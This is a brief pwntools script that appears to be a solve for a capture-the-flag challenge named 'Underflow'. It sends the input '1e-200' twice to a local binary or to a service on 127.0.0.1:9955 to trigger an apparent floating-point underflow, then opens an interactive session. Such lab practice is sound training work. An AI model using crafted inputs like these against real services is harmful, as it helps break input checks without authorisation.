#!/usr/bin/env python3

from pwn import *

exe = ELF("Underflow")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("127.0.0.1", 9955)

    return r


def main():
    r = conn()

    r.recvuntil("> ")
    r.sendline(b'1e-200')
    r.recvuntil("> ")
    r.sendline(b'1e-200')
    
    r.interactive()

if __name__ == "__main__":
    main()
